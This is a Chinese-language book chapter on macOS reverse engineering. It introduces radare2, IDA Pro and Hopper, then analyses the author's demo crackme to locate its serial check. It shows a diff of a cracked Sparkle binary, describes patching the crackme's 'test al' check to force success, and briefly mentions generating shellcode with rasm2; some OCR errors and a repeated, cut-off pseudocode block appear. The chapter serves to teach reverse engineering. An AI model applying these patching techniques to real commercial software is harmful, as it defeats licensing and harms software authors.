本书讨论的静态分析指的是二进制静态分析，即大家常说的软件逆向分析。软件逆向分析包含了软件的二进制静态分析与动态调试，两种分析方法需要使用不同的分析工具。目前，主流的分析工具基本同时包含了静态与动态分析功能。下面介绍几款在软件逆向分析领域大名鼎鼎的静态分析工具，在实际分析过程中，大家需要掌握好它们的使用技巧。

#### 6.2.1 Radare2

Radare2是一套开源、跨平台的命令行工具集，项目地址为https://github.com/radare/radare2。支持在Linux、Windows、macOS、Android等主流的系统平台上运行，是软件逆向分析工作的必备神器。

Radare2支持的CPU架构与二进制格式非常多，其中就包含了本书讨论的x86-64平台下的Mach-O格式。使用Radare2提供的命令行工具可以很方便地反汇编、调试、操作二进制文件。

Radare2的安装很简单，可以通过GitHub下载编译的方式编译，也可以直接安装官方编译制作好的pkg安装包 $ ^{①} $。如果本机安装了HomeBrew，那么安装Radare2会更简单，只需要在命令行执行如下命令即可：

$ brew install radare2

安装完成后，本机的/usr/local/bin/目录下会安装好一份Radare2命令行工具。随着Radare2版本的升级迭代，Radare2提供的命令行工具会发生变化，旧的命令可能会在新的版本中被删除。目前最新版本包含的命令如下所示：

$ ls /usr/local/bin/ra*2 /usr/local/bin/r2*
/usr/local/bin/r2 /usr/local/bin/radare2 /usr/local/bin/rahash2
/usr/local/bin/r2agent /usr/local/bin/radiff2 /usr/local/bin/rarun2
/usr/local/bin/r2pm /usr/local/bin/rafind2 /usr/local/bin/rasm2
/usr/local/bin/rabin2 /usr/local/bin/ragg2 /usr/local/bin/rax2

下面逐个看看它们的用途。

(1) rabin2。在开始分析二进制前，可以使用rabin2命令查看目标文件的基本信息。如二进制的文件格式信息、字符串列表、重定位信息、段信息、导出符号等。执行以下命令显示python命

令的段信息如下：

$ rabin2 -S /usr/bin/python
[Sections]
idx=00 vaddr=0x00001be0 paddr=0x00001be0 sz=7163 vsz=7163 perm=m-r-x name=0.text
idx=01 vaddr=0x000037dc paddr=0x000037dc sz=330 vsz=330 perm=m-r-x name=1.__symbol_stub
idx=02 vaddr=0x00003928 paddr=0x00003928 sz=562 vsz=562 perm=m-r-x name=2.__stub_helper
idx=03 vaddr=0x00003b5a paddr=0x00003b5a sz=1046 vsz=1046 perm=m-r-x name=3.__cstring
idx=04 vaddr=0x00003f70 paddr=0x00003f70 sz=66 vsz=66 perm=m-r-x name=4.__const
idx=05 vaddr=0x00003fb4 paddr=0x00003fb4 sz=72 vsz=72 perm=m-r-x name=5.__unwind_info
idx=06 vaddr=0x00004000 paddr=0x00004000 sz=20 vsz=20 perm=m-rw-name=6.__nl_symbol_ptr
idx=07 vaddr=0x00004014 paddr=0x00004014 sz=220 vsz=220 perm=m-rw-name=7.__la_symbol_ptr
idx=08 vaddr=0x000040f0 paddr=0x000040f0 sz=32 vsz=32 perm=m-rw-name=8.__cfstring
idx=09 vaddr=0x00004110 paddr=0x00004110 sz=40 vsz=40 perm=m-rw-name=9.__data
idx=10 vaddr=0x00004138 paddr=0x00001000 sz=1032 vsz=1032 perm=m-rw-name=10.__bss

11 sections

(2) rasm2。rasm2是Radare2提供的汇编与反汇编工具。可以执行rasm2 -L查看支持的CPU架构。在macOS上，使用rasm2时如果没有指定CPU架构，则默认是x86。可以执行如下命令查看十六进制数据“4831c0”表示的反汇编代码：

$ rasm2 -a x86 -b 64 -d '4831c0'
xor rax, rax

也可以执行如下命令查看反汇编代码的机器码：

$ rasm2 -a x86 -b 64 'mov eax, 1'
b801000000

在使用rasm2编写Shellcode时，可以配合脚本自动生成Payload，非常方便。

(3)rahash2。使用rahash2可以很方便地计算字符串或文件的哈希（Hash）值。执行rahash2 -L 可以查看支持的哈希算法，如下所示：

$ rahash2 -

md5

sha1

sha256

sha384

sha512

crc16

crc32

md4

xor

xorpair

parity

entropy

hamdist

pcprint

mod255

xxhash

adler32

执行以下命令可以查看字符串"hello"的sha1值：

$ rahash2 -a sha1 -s "hello"
0x00000000-0x00000004 sha1: aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d

执行下面的命令可以查看python程序的crc32:

$ rahash2 -a CRC32 - < /usr/bin/python
-: 0x00000000-0x000104af CRC32: 22be9ce2

(4) radiff2。radiff2在分析两个目标文件的差异时非常有用。执行以下命令可以查看文件哪里被修改过：

$ radiff2 - a x86 - b 32 - p ./Sparkle_src ./Sparkle_crack
0x0001f052 4488f24c8b75b04d85f60f858d000000 => b201b00149c7c60100000090909090 0x0001f052

也可以执行以下命令，直接查看修改过的反汇编代码：

$ radiff2 -a x86 -b 32 -D ./Sparkle_src ./Sparkle_crack
--- 0x0001f052
inc esp
mov dl, dh
dec esp
mov esi, dword [ebp - 0x50]
dec ebp
test esi, esi
jne 0x9d

+++ 0x0001f052
mov dl, 1
mov al, 1
dec ecx
mov esi, 1
nop
nop
nop
nop
nop

(5) rafind2。此工具用于目标文件中查找字符串及十六进制数据。比如查找系统1s命令中包含了字符串"open"的地方可以执行如下命令：

通过这段反汇编代码可以看出，破解版本的Sparkle_crack文件将返回结果寄存器a1置1，并将jne比较跳转nop掉了。

$ rafind2 -a x86 -b 64 -s "open" /bin/ls
0x4b6d
0x62f3
0x6faf

(6) rarun2。该工具既可以作为一个脚本宿主程序，执行自定义的rr2脚本文件，也可以指定环境变量与参数，作为二进制程序的启动程序。例如，执行以下命令后，rarun2会调用执行/bin/ls，后者会列出/usr/bin目录的文件列表，并将结果输出到桌面上的lsout.txt文件中：

$ rarun2 program=/bin/ls chdir=/usr/bin stdout=~/Desktop/lsout.txt

(7) rax2。进制转换工具。可以在常用的进制间转换，甚至可以在字符串与十进制字符串间进行转换。十六进制序列转字符串如下：

$ rax2 -s 48656c6c6f0a
Hello

字符串转十六进制序列如下：

$ rax2 -S Hello
48656c6c6f

不同进制间的数据转换如下：

int -> hex rax2 10
hex -> int rax2 0xa
-int -> hex rax2 -77
-hex -> int rax2 0xfffffb3
int -> bin rax2 b30
bin -> int rax2 1010d
float -> hex rax2 3.33f
hex -> float rax2 Fx40551ed8
oct -> hex rax2 350
hex -> oct rax2 0x12 (0 is a letter)
bin -> hex rax2 1100011b
hex -> bin rax2 Bx63

(8) r2agent。用于远程调试。执行r2agent -a开启监听后，可以在浏览器中远程访问并调试程序，目前macOS上该程序功能残缺。

(9) ragg2/ragg2-cc。一个自定义的编译器，可以编写代码生成简短的程序。一个简单的Hello World程序如下：

$ cat hi.r
write@syscall(4); //x64 write@syscall(1);
exit@syscall(1); //x64 exit@syscall(60);
main@global(128) {
    .var0 = "hi!\n";
    write(1,.var0, 4);
    exit(0);
}
$ ragg2 -0 -F hi.r
$./hi
hi!

(10) r2pm。Radare2包管理工具，用于安装与卸载Radare2插件。安装yara3插件可以执行如下命令：

$ r2pm install yara3

(11) r2/radare2。Radare2的主程序，集成了以上所有命令的功能。使用radare2可以打开一个空的或已经存在的文件，打开完成后，radare2会打开一个交互界面，分析人员可以输入命令对文

件进行分析与调试。如使用radare2分析python程序，可以执行如下命令：

$ radare2 -A -a x86 -b 64 - /usr/bin/python
syntax error: error in error handling
syntax error: error in error handling
[Cannot find function 'entry0' at 0x100000e20entry0 (aa)
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[*] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
-- You see it, you fix it!
[0x100000e20]>

进入交互环境后，使用aaa命令可以分析所有的函数，使用p命令可以打印信息，使用S命令可以列出目标程序的段信息，使用f命令可以列出目标程序中的符号信息。更多命令的使用，可以执行!help查看帮助。

Radare2还通过R2Pipe对外提供了脚本化支持，分析人员可以使用Radare2支持的主流语言来开发脚本，实现自动化二进制分析，如下代码片段所示：

r2p = R2Pipe.new("mal") #initialize the object
r2p.cmd('aaa') #analyze all functions
functions = r2p.cmd('aflj') #return the function lists in JSON
func = JSON.parse(functions) #parse the JSON

所有向外提供的API都是R2Pipe提供的接口，执行aaa与af1j命令完成后，会返回一个函数列表，包含了目标程序中的所有函数，接下来，可以对所有的函数进行下一步分析工作。有兴趣的读者可以访问http://www.morphick.com/blog/2016/1/6/writing-a-malware-config-parser-using-radare2-and-ruby查看一个使用Radare2与Ruby实现的完整的脚本化实例。

#### 6.2.2 IDA Pro

IDA Pro是一款功能强大的跨平台反汇编工具与调试器，可以在Linux、Windows与macOS上运行，在逆向工程领域，几乎没有一款工具能撼动它的地位。IDA Pro是Hex-Rays公司开发的一款商业软件，在官网https://www.hex-rays.com上可以下载演示Demo版本。Demo版本只提供了32位的PE/ELF/Mach-O格式的程序分析功能，如果要想使用完整版本的功能，需要到官网或代理商处购买。IDA Pro由于其应用市场的原因，价格偏高，而且不同平台的主程序与插件都是单独售卖的。通常该软件只有逆向专业领域的公司才会用到，个人用户可以购买基础版本，提供的loader模块足够Mach-O程序分析了。

在使用IDAPro分析程序时，只需要将程序拖到启到的IDAPro的主界面即可，IDAPro会自动识别程序的CPU架构及类型，点击OK后会自动开始分析程序。根据目标程序的大小，分析的时间可能是几分钟到数小时不等。分析完成后，会以流程图的形式从程序的人口点开始，展示程序入口的流程，如图6-1所示。

 </div>

主界面左侧是函数列表与当前函数的图形缩略图，函数列表中不同类形的函数以不同的颜色展示，库函数以绿色显示，常规函数以蓝色显示，外部符号以红色显示。在函数列表上，可以按ctrl+F搜索指定的函数名，函数列表下面的缩略图窗口可以快速查看当前函数的流程。当流程较复杂时，可以鼠标点击缩略图的不同地方，快速定位反汇编窗口中的代码。正中间的反汇编窗口显示了程序的反汇编代码，IDAPro自动分析出的交叉引用、代码注释与函数原型都会一目了然。按键盘上的空格键，可以在反汇编视图与流程图之间切换。流程图中的每个代码块使用两种颜色的线进行连接，绿色表示条件为true时跳转，红色表示条件为false时跳转。其中，每个流程块的标题与颜色也可以进行手动修改，方便分析人员对分析过的内容进行标记，如图6-2所示。

 </div>

IDA Pro强大的分析功能体现在结构体、交叉引用与符号重命名上。使用flair技术，IDA Pro在分析阶段会自动识别二进制中的符号及变量的类型。这对于理解反汇编代码是大有裨益的，未识别的函数最终以sub_开头命名，分析人员可以根据需要自己制作sig签名来识别这些函数，或者手动分析，为它们重命名。

脚本化与插件支持是IDA Pro另一个强大的功能点。编写脚本与插件可以将大量的手动工作解放出来，从而自动化地运行任务。对代码段的静态解密、特殊数据及算法的查找等工作，在逆向分析时会经常使用。使用脚本与插件功能，配合动态调试，甚至可以打造出一套完美的自动化脱壳方案。

上一节讲到的Radare2工具包含了文件比较、算法查找、文件修改功能，借助强大的插件接口，在IDA Pro中，这些功能都有相应的插件来完成。比如在文件比较方面，有知名的BinDiff插件，这款插件支持二进制文件分析和对比，是一款商业程序，目前已经免费；在算法查找方面，有IDA Pro官方编写的findcrypt插件，通过在二进制中查找常用算法的Magic魔数，可以直接识别其中可能使用到的加解密与Hash算法，有兴趣的读者可以查看它的源代码，代码可以在随程序发布的sdk工具包中找到；在文件修改补丁方面，也有很多不错的插件，比如较早的使用C++开发的插件patchdiff2 $ ^{①} $，以及使用更广泛的Python插件ida patcher $ ^{②} $，目前，最新版本的IDA Pro程序中集成了文件初丁功能，可以直接对文件进行修改了。

#### 6.2.3 Hopper

Hopper是软件逆向工程界的后起之秀。在IDA Pro盛行多年后，还没有一款反汇编工具能与它相匹敌，但它高昂的价格让一般分析人员难以接受，市场上严重缺乏一款“平民”级别的反汇编工具，Hopper就是在这样的环境下问世的。如果说IDA Pro是一个深怀绝技的老者，那Hopper就是一个正在快速成长的武林高手。最初，Hopper被安全分析人员所知，是由于它提供的伪代码生成插件。在很长的一段时间里，查看反汇编代码生成的伪代码，只有IDA Pro的Hex-Rays Decompiler插件这一个途径，Hopper的出现让安全研究人员有了新的选择。

与IDA Pro一样，Hopper也是一款商业软件。使用完整版本功能的软件，需要向开发商支付一定的软件授权费用，不过Hopper的价格不像IDA Pro那么高。目前，IDA Pro的最新版主程序加上全平台分析插件的售价近6万人民币，而Hopper正式版只需要700多块钱，几乎是IDA PRO价格的百分之一！Hopper官网提供了软件最新版本的完整试用版与开发用的SDK供用户下载 $ ^{③} $。Hopper更新的频率比较频繁，不像IDA Pro一年只更新一到两次。Hopper更新最快的时候，一个月更新近10次！

Hopper也是跨平台的软件，v3与v4版本支持在Linux与macOS上运行，较早的v2版本还支持

在Windows系统上运行。至于为什么在v3以后放弃了对Windows系统的支持，原因不得而知，不过它目前在macOS系统上运行良好，分析Mach-O程序已经完全足够。Hopper在macOS系统上的运行界面如图6-3所示。

 </div>

除了最上面的操作按钮，整个主界面默认分为左、中、右3部分。左边栏在Labels与Strings中分别列出了目标程序中的符号与字符串，在Labels标签中，又可以根据Tag对解析出的类与成员进行分类显示，Strings标签中会列出所有的字符串，分析人员使用它搜索特定的字符串信息来定位关键代码。位于界面正中间的是反汇编窗口，展示了程序的反汇编代码，分析人员可以阅读和修改反汇编代码，为它们添加交叉引用与注释。当鼠标位于一个函数内的时候，可以按下键盘上的空格键显示函数的流程图，此操作与IDA Pro是一样的。右边栏是检查面板，显示了文件的信息与物理视图。当鼠标位于函数的指令时，还会实时显示指令的十六进制编码、所在行的注释、交叉引用以及函数原型等信息。

Hopper整体操作方式与IDA Pro相同，它同样支持数据代码的交叉引用、插件及脚本化支持，但目前为Hopper编写插件与脚本的人员似乎并没有那么多，图6-4是Hopper官方自带的插件列表。

可以看出，目前Hopper支持的CPU架构与文件格式都是十分有限的，没有提供直接的算法查找与文件比较功能，这些可以通过插件或脚本来实现。至于文件修改功能，与IDA Pro不同，Hopper倒是直接提供了。在Hopper界面上，可以点击菜单Modify→Assemble Instruction修改反汇编代码，或者点击NOP Region直接将代码置为nop。操作完成后，可以点击菜点File->Produce New Executable将修改应用保存到新的文件，此功能在修改软件时十分方便。

 </div>

 </div>

### 6.3 代码分析技术

软件逆向分析与软件开发设计一样，都有自己的一套方法论。在软件开发领域，不同的应用场景有着不同的软件开发方法，这称为软件开发的设计模式。设计模式是开发经验的总结与积累，在逆向分析领域，也有一些通用的、没有成文的分析技术。本节将要介绍的内容，一部分是公开的常见的逆向分析程序的总结，一部分是笔者对于逆向分析技术的见解。希望读者能在掌握它们的基础上，寻找到更加有效通用的程序逆向分析方法。

为了更好地讲解分析的过程，本节编写了演示程序crackme，运行界面如图6-5所示。本节的任务就是找到程序计算注册码的地方，还原出软件的注册码生成算法。

 </div>

#### 6.3.1 行为分析

一般情况下，拿到程序的第一件事就是运行它，查看它的运行行为，了解软件的注册机制，通过它的行为初步猜测程序的加密机制与加解密算法。

启动crackme后，在标题栏上显示未注册，按照crackme提示的格式，输入错误的用户名与注册码后，点击Register按钮，程序弹出如图6-6所示的错误信息。

 </div>

点击Clean按钮，就会清空用户名与注册码输入框的内容。最终可以判断，找到Register按钮的点击事件响应代码，就可以找到算法所在的位置。

crackme的行为给外界最明显的提示是，注册错误时，会弹出错误提示信息“serial number error!”，可以将该字符串作为查找验证算法的突破口。打开Hopper，将crackme拖入进行分析，在Strings一栏中输入“serial number error!”进行搜索，找到一处字符串，双击字符串，在反汇编窗口找到调用，按下键盘上的X键，打开交叉引用窗口，如图6-7所示。

 </div>

从交叉窗口中可以看出，Register按钮点击后，调用了- $ [\_TtC7crackme11AppDelegate onReg:] $：该方法调用了___TFC7crackme11AppDelegate5onRegfPs9AnyObject_T_：，最终弹出错误提示。找到了关键代码所在，接下来分析这两个方法的内容就可以了。

#### 6.3.2 资源分析

macOS的UI程序的布局保存在app的Resources目录下的nib文件中。该文件是一个二进制的plist文件，可以使用工具NibUnlocker $ ^{①} $解密nib文件的信息，也可以使用文本编辑器BBEdit $ ^{②} $直接打开。使用BBEdit打开MainMenu.nib文件，搜索<key>NS.string</key>会列出界面上所有的控件信息，如图6-8所示。

Line 701 Co 13 HTML : Uncode (UTF-8) : Web (LF) : Last saved: 9/19/16, 20:02:57:20 /3 /0 100%

 </div>

可以使用BBEdit直接修改控件的title与尺寸信息，这通常是软件汉化工作者要做的事情。还可以使用UI布局检查工具来查看程序的界面布局，比较老的工具有苹果官方提供的工具UIElementInspector。打开UIElementInspector后，运行crackme，将鼠标停留在Register按钮，会显示Register按钮的控件信息，如图6-9所示。

 </div>

能完成同样功能的还有商业工具UI Browser，运行后显示的信息比UIElementInspector更加丰富，如图6-10所示。

 </div>

除此之外，UI Browser还支持通过鼠标操作方式直接生成AppleScript，自动化操作App，如图6-11所示。

 </div>

但以上工具与方法都不能直接找到按钮的事件响应代码，还需要想其他方法。macOS界面程序的类一般以“ViewController”命名，但对于这种单UI的程序来说，一般的事件响应使用“AppDelegate”来命名。根据这个思路到Hopper的Labels中去查找，点击TagScope，可以看到有一个[_TtC7crackme11AppDelegate]开头的标签头，点击一下会显示出所有的方法，如图6-12所示。

 </div>

从图中结果初步判断，-[_TtC7crackme11AppDelegate onReg:]:可能是关键的方法，接下来就需要自己去看代码检查是否是关键所在了。

#### 6.3.3 数据分析

关闭crackme后重新打开，会发现之前输入的用户名与注册码自动填入了crackme的输入框内，说明程序在启动的时候读取了本地保存的注册信息。这时可以从注册文件入手，对程序进行分析。

对于未加入沙盒功能的crackme来说，保存文件的方法通常有以下几种。

□ UserDefaults.macOS提供了NSUserDefaults类来让开发人员快速将一些数据以键值对的形式保存下来，以便下次使用的时候读取。简单地保存用户名与注册码的代码如下所示：

其中保存的username与sn键值正是上一步输入的内容。此时，直接修改此处的数据并不会直接生效，因为NSUserDefaults读取的数据会在内存中缓存一份，在系统下次重启时，才会重新读取fc.crackme.plist文件的内容。

let defaults = NSUserDefaults.standardUserDefaults()
defaults.setObject(username, forKey: "username")
defaults.setObject(sn, forKey: "sn")
读取的代码大致如下所示：
let defaults = NSUserDefaults.standardUserDefaults()
if (defaults.objectForKey("username") != nil) && (defaults.objectForKey("sn") != nil) {
    let username = defaults.objectForKey("username") as! String
    let sn = defaults.objectForKey("sn") as! String
}

这种方式保存的数据，最终以app的包名为文件名，保存为plist格式的文件，保存在~/Library/Preferences目录下。在本例中，此目录下有一个fc.crackme.plist文件，使用BBEdit打开它，可以看到内容如下：

   </div>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>sn</key>
<string>1234-4567-7890-ABCD</string>
<key>username</key>
<string>macbook</string>
</dict>
</plist>

KeyChain。应用程序可以使用KeyChain保存重要的数据，如注册码、密码等信息。直接使用KeyChain提供的API比较麻烦，网上有人开发出了第三方接口供调用，如Keychain-Access $ ^{①} $，本节的crackme没有使用到KeyChain。

Core Data。这是另一种保存数据的方法，它本质上是对Sqlite数据库访问的一层外包装。同样，有不少优秀开源的库可以让开发人员更加方便地使用Core Data，如QueryKit $ ^{②} $。Core Data保存的数据存放在“~/Library/Application Support/包名”目录下，以sqlite结尾保存的数据库文件。本节的crackme没有使用到Core Data。

自定义路径的数据文件。在不采用苹果提供的公开数据存储接口时，也可以自由地使用第三方数据存储类。数据可以自由地以明文或加密的形式保存到系统中有权限读写的目录中。如果在分析程序时，数据是以这种方式保存的话，可以尝试采用动态调试或其他方式来分析。

#### 6.3.4 流量分析

一些较复杂的程序,代码量非常大,查找关键代码可以从网络流量分析入手。这就涉及macOS系统上网络抓包的问题。网络数据包的抓取,可以使用跨平台网络抓包工具tcpdump,在终端执行如下命令就可以开启抓包,并自动将数据包保存到桌面的data.pcap文件中。

$ sudo tcpdump -p -vv -s 0 -w ~/Desktop/data.pcap
Password:
tcpdump: data link type PKTAP
tcpdump: listening on pktap, link-type PKTAP (Packet Tap), capture size 262144 bytes
^C219 packets captured
241 packets received by filter
0 packets dropped by kernel

抓取完成后，按键盘上的Ctrl+C键结束。保存的data.pcap文件可以使用抓包工具WireShark $ ^{③} $打开，如图6-13所示。

 </div>

WireShark是跨平台的工具，在macOS上运行良好，喜欢UI界面程序的读者，可以直接使用WireShark来抓包分析。除了WireShark外，在macOS上还有一些优秀的抓包工具，如CocoaPacketAnalyzer $ ^{①} $，运行界面如图6-14所示。该工具只能在macOS系统上使用，操作界面与WireShark类似。

 </div>

另外，使用频率较多的工具还有Charles $ ^{①} $，运行界面如图6-15所示。

 </div>

搭配使用这些工具，在分析程序的网络流量时就会游刃有余了。

经过抓包发现，crackme没有使用网络来发送与接收数据。

#### 6.3.5 API 分析

当产品的需求被提出时，开发人员第一时间考虑的是如何去实现它的功能，优化与用户体验则是之后才会考虑的事情；逆向分析人员与开发人员一样，看到软件运行的功能后，第一时间想到的是该功能如果让自己来完成，该如何实现它，实现该功能应该使用什么技术方案，调用什么API等。

要想掌握macOS软件逆向分析技术，就需要对macOS的SDK中提供的API有所了解。与Windows系统弹窗调用MessageBox()一样，macOS系统上的弹窗也有专属的API：NSAlert()。通过查找调用接口的使用位置，也可以快速找到关键的代码所在。使用Hopper打开本节中crackme，在Labels中搜索NSAlert，结果显示了好几个经过名称改编的结果，点击其中的_OBJC_CLASS_$_NSAlert：，在显示的反汇编窗口的XREF注释处，按键盘上的X键，可以看到有两处调用。选择下面的_TaaS7NSAlert：，再次按下X键，查看它的交叉引用信息，发现在onReg与onAbout中有调用，如图6-16所示。

 </div>

接下来就是检查这两个方法的代码，来确定具体是哪个调用了。前面已经分析过，弹出的注册码错误信息是在onReg中调用的。

### 6.4 反汇编工具的使用

找到了关键代码的所在地，下一步要做的工作就是分析理解代码了。现代化的反汇编工具有以下3种形式呈现反汇编代码的内容。

□ 反汇编代码模式。原始地展现了目标程序中的反汇编代码。根据工具的智能程度不同，反汇编代码在可读性方面可能会有所不同。如IDA Pro通常会将方法的声明、调用关系的交叉引用、栈帧信息、注释都添加上；Hopper对Objective-C生成的反汇编代码，给出的反汇编结构化信息更准确一些。

流程图模式。当代码量较大时，可能更加关注代码的执行流程，而不是具体的指令细节。此时，流程图模式就派上用场了。目前，Radare2、IDA Pro、Hopper等工具都提供了流程图模式。

□ 伪代码模式。伪代码生成技术是指通过反汇编指令生成高级语言代码的一种技术，最终达到与汇编指令功能相同、尽可能完整重新编译的高级语言代码。Radare2目前不支持此功能，IDA Pro通过插件提供伪代码生成功能，Hopper则自带了该功能。

#### 6.4.1 反汇编

在反汇编代码模式下，分析人员需要通过阅读汇编指令来理解代码的功能。在一些逆向工程的测验赛事或活动中，阅读反汇编代码并实现最终高级语言版本的加解密算法，是考验逆向工程能力的一种最原始的方法。

macOS自10.6以后，进入了64位CPU时代。虽然目前macOS同时支持x86与x86-64架构的指令，

但出于运行效率的考量，越来越多的程序使用了x86-64架构，分析x86-64架构的程序显然比x86花的时间要多一些。

x86-64架构的反汇编代码使用的寄存器比x86架构要多，生成的反汇编代码也更加晦涩难懂。使用Swift开发的程序，生成的代码中包含了对Objective-C调用的包装代码。这样本来就复杂的反汇编工作变得更难了。因此，在分析x86-64平台的代码时，一行行地阅读反汇编代码不太现实，需要有一些其他的分析技巧。例如本例中的crackme，查看Strings列表中的字符串发现有字符串"serial ok！"，这很可能是注册成功时弹出的提示信息，可以以此为突破口进行反汇编分析。双击选中的字符串，在反汇编窗口中按键盘上的X键，查找它的交叉引用，只有一处引用了该字符串，双击来到如下反汇编行：

0000000100003b17 mov rax, qword [ss:rbp+var_178]
0000000100003b82 call __TFCSo7NSAlertCfT_S
0000000100003b87 lea rdi, qword [ds:0x100006fe6] ; "serial ok!"
0000000100003b8e mov edx, Oxa
0000000100003b93 mov esi, edx
0000000100003b95 mov edx, 0x1
0000000100003b9a mov qword [ss:rbp+var_180], rax
0000000100003ba1 mov qword [ss:rbp+var_438], rax
0000000100003ba8 call imp_stubs_TFSSCfT21_builtinStringLiteralBp8byteSizeBw7isASCIIBi1_SS
0000000100003c7a jmp 0x1000040c1
0000000100003c7f mov rax, qword [ds:imp_got_swift_isaMask]

整个代码块以0000000100003b17开头，以0000000100003c7结尾。在Hopper中，反汇编代码中的反汇编块以整行的虚线显示出来，反汇编块的每一行通常会有一条指令跳转到此处，这从Hopper反汇编窗口最左侧跳转进来的箭头可以体现出来。在反汇编块的最后一行，通常都是一条指令跳转到别处，整个反汇编块中除了短距离的小跳转外，都是顺序执行的指令流，再无其他跳转。

0000000100003b87行获取了字符串的引用，一定是在此反汇编块中弹出的注册成功提示信息，双击0000000100003c7a行的指令jmp 0x1000040c1，看看代码执行完成后，最终跳转去了哪里。从反汇编代码中可以看到，目的地00000001000040c1在执行了几个imp_stubs_swift_unknown-Release后，代码就返回了，可见猜测是正确的！按下键盘上的esc键，再次回到反汇编最后一行，看下面0000000100003c7f处的代码，从Hopper给出的箭头信息可以看出，0000000100003c7f处的代码是从上面跳转过来的，而且直接跳过了分析的代码块，将鼠标定位到0000000100003c7f，按键盘上的X键，查看它的交叉引用，看看是从哪里跳转过来的。双击调用处后，来到00000001000037e9，如图6-17所示。

 </div>

可以看到，关键反汇编代码如下所示：

仔细阅读这一段代码，可以发现，它是在调用00000001000037e5行指令call rax，判断其返回结果是否为1才决定是否跳走，因此有理由相信，此函数调用就是注册码的验证算法所在！函

   </div>

数的地址取值为[ss:rbp+var_3A8]，它的赋值来源于上面000000010000378f行rcx寄存器的赋值。rcx寄存器在上面取值为[ds:imp_got_swift_isaMask]加上一个索引值0xf8。imp_got_swift_isaMask是Swift类内部的一个isa实例指针，也就是面向对象语言中的this指针，0xf8则是该类中一个方法偏移值，此处Hopper没有智能识别该方法的名称。

通过以上信息，可以知道，00000001000037e7行的指令test al, 0x1就是crackme的爆破点所在！只要将其改成其他指令，如mov al, 0x1，即可完成程序的破解。

使用Radare2与IDA Pro的操作类似, 只是Radare2没有图形界面, 操作起来可能会有些许不便, 不过在显示效果方面, 一点也不比其他两个工具差, 如下所示:

[0x1000065a0]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[*] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[0x1000065a0]> pd $r @ sym.__TFC7crackme11AppDelegate5onRegfPs9AnyObject_T__;-- func.100002910:
F (fcn) sym.__TFC7crackme11AppDelegate5onRegfPs9AnyObject_T_6131
; var int local_Oh @ rbp-0x0

pd $r @ sym._TFC7crackme11AppDelegate5onRegfPs9AnyObject_T_执行后，会显示onReg方法的反汇编代码，并且代码着色与流程前头，一个也没有少，如图6-18所示。

 </div>

除此之外，Radare2还支持一种叫作“Visual Disassembly”的可视化反汇编模式。在反汇编时，输入大写的V命令，再输入小写v命令，就进入了可视化模式。在该模式下，左边上面显示的是菜单，下面显示的是函数列表，右边显示的是函数的反汇编代码。可以根据菜单提示，按键盘上相应的快捷键来进行操作。比如按J或K可以分别向上与向下选择要操作的函数，选择后会在函数左边的开头多一个小圆点，此时可以按下G键选择该函数，再次按V进入代码可视模式，此时左边会多出一个右键头，表示此函数已经选定为当前操作的函数，如图6-19所示。

 </div>

此时，可以按键盘上的1键进入该函数。进入函数后，根据要求添加、删除与修改变量、注释以及交叉引用信息，如图6-20所示。

 </div>

#### 6.4.2 流程图

上一节在讨论反汇编分析的过程中，使用了Hopper给出的指示箭头来充当流程图。流程图可以更加直观地展示代码的执行流程。定位到关键的代码后，按下键盘上的空格键，代码的流程图就会展示出来，如图6-21所示。

 </div>

但Hopper的流程图功能比较弱，只支持缩放查看，不支持流程块的着色与重命名。在这一点上，IDA Pro要强大很多。在IDA Pro中将上面分析的关键流程块着色为绿色，流程图如图6-22所示。

 </div>

IDA Pro在反汇编模式下，也会为每个流程块显示标号与一条虚线。在流程图模式下，也可以双击流程图的箭头来直接跳转到调用与被调用处，非常方便。但在Objective-C的方法识别方面，还略逊于Hopper。因此，在实际的分析过程中，分析人员通常配合使用几种工具。

#### 6.4.3 伪代码

在Hopper中查看一个函数的伪代码很简单，只需要将鼠标放到要查看的函数内，按下键盘上的option+enter键，即可弹出Pseudo Code伪代码窗口，如图6-23所示。相应的代码在IDA Pro中显示如图6-24所示。

Remove potentially dead code
Remove LO/HI macros
int _TFC7crackme11AppDelegate5onRegfPs9AnyObject_T_(int arg0, int arg1, int arg2) {
    rdx = arg2;
    rcx = *arg1;
    rcx = rcx & *swift_isaMask;
    var_1B8 = arg0;
    var_1C0 = arg1;
    var_40 = (*(rcx + 0x80))(arg1, arg1, rdx, rcx);
    if (var_40 == 0x0) {
        rcx = "unexpectedly found nil while unwrapping an Optional value";
        rdx = 0x2;
        _TTSf4s_s_d_d__TFs18_fatalErrorMessageFTVs12StaticStringS_S_Su_T_("fatal error", 0xb, rdx, rcx, 0x39, 0x2);
    }
    [var_40 retain];
    rax = [var_40 stringValue];
    rax = [rax retain];
    rax = _TF10Foundation24_convertNSSStringToSt[ringFGSqCSo8NSSString_SS(rax);
    var_1D8 = rax;
    var_1E0 = rdx;
    var_1E8 = rcx;
    [var_40 release];
    [var_40 release];
    if ((_TFSSg7isEmptySb(var_1D8, var_1E0, var_1E8) & 0x1) == 0x0) {
        rcx = var_1C0;
        rdx = *rcx;
        rdx = rdx & *swift_isaMask;
        var_60 = (*(rdx + 0x68))(rcx);
        if (var_60 == 0x0) {
            rcx = "unexpectedly found nil while unwrapping an Optional value";
            rdx = 0x2;
            _TTSf4s_s_d_d__TFs18_fatalErrorMessageFTVs12StaticStringS_S_Su_T_("fatal error", 0xb, rdx, rcx, 0x39, 0x2);
        }
        [var_60 retain];
    }
}

Remove potentially dead code
Remove LO/HI macros
int _TFC7crackme11AppDelegate5onRegfPs9AnyObject_T_(int arg0, int arg1, int arg2) {
    rdx = arg2;
    rcx = *arg1;
    rcx = rcx & *swift_isaMask;
    var_1B8 = arg0;
    var_1C0 = arg1;
    rdx = 0x2;
    rdx = 0x2;
    var_40 = (*(rcx + 0x80))(arg1, arg1, rdx, rcx);
    if (var_40 == 0x0) {
        rcx = "unexpectedly found nil while unwrapping an Optional value";
        rdx = 0x2;
